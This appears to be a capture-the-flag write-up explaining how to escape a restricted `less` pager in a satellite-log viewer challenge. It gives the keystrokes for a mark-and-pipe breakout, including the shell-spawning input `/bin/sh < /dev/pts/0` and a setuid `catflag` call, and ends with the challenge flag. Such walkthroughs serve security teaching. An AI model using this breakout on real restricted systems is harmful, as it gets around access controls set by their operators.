# Space is Less than Ideal
This challenge is a breakout of less.

Some guides online state that you can secure less by setting `SHELL` to `/bin/nologin`. However, this has two attacks that can occur still:
1. `e` for Examine is still enabled on some less prompts
2. Mark-execute is still enabled on most/all tested less prompts

For this challenge, `e` is disabled by requiring use of the `catflag` program, a simple setuid program that cats the flag.

As such, we need to do a mark-execute exploit:
1. Mark a line in the file with `m` (marking it `a`)
2. Press `|` (vertical pipe) to tell less to execute a line
3. Tell it to execute marked line `a`
4. Less prompts with the `!` prompt, but you can break out with `/bin/sh < <TERMINAL HERE>` (where TERMINAL HERE is set to the current terminal being used) 

## Writeup
The screens go through several options:
1. Log viewing
2. Advanced options requiring a token that seem to be disabled
3. Videos, including a link to `vim` exploits... which are pretty similar to `less` exploits.
4. Select "Debug TTY Info" for the information on the running terminal
    * example, `/dev/pts/0`
5. Select "Access Logs"
    ```
    2025-09-01T00:00:00.001Z [HK] [POWER] Solar Array Current: 0.00 A | Battery Voltage: 26.7 V | SOC: 87%
    2025-09-01T00:00:00.009Z [HK] [THERMAL] Radiator Temp: 15.2 °C | Bus Temp: 14.9 °C | Battery Temp: 16.1 °C
    2025-09-01T00:00:00.020Z [COMM] Beacon Sent | Downlink Power: 4.8 W | S-Band RSSI: -68.2 dBm
    2025-09-01T00:00:00.025Z [ADCS] Wheel Speeds: X=0 rpm Y=0 rpm Z=0 rpm | Mode: IDLE

    2025-09-02T06:15:11.334Z [HK] [POWER] Solar Array Current: 1.45 A | Battery Voltage: 28.1 V | SOC: 96%
    2025-09-02T06:15:11.342Z [PAYLOAD] Camera Heater: OFF | CCD Temp: -33.8 °C | Status: STANDBY
    2025-09-02T06:15:11.365Z [COMM] Link Margin: 3.2 dB | Uplink Nominal | Frame Error Rate: 0.01%

    System Access Logs (q to quit)
    ```
6. Mark the first line in the file by entering `m`
    * `set mark: `
7. Enter `a`
    * `System Access Logs (q to quit)`
8. Enter `|`
    * `|mark: `
9. Enter `a`
    * `!`
10. Enter `/bin/sh < /dev/pts/0`
    * `!/bin/sh < /dev/pts/0`
    * `$ `
11. Enter `./catflag`
    * `$ ./catflag`
12. Flag is printed
    * `sun{less-is-more-no-really-it-is-just-a-symbolic-link}`